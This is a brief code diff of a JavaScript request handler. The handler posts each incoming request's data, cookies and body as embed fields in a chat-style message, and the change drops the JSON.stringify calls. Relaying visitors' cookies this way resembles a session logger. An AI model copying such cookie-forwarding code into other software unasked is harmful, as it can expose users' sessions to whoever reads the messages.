@@ -26,11 +26,11 @@ export default async function handler(req, res) {
       content: 'New request received',
       embeds: [{
         title: 'Request Data',
-        description: JSON.stringify(data, null, 2),
+        description: data,
         color: 0x3498db,
       }, {
         title: 'Cookies',
-        description: JSON.stringify(cookies, null, 2),
+        description: cookies,
         color: 0x3498db,
       }, {
         title: 'Body',
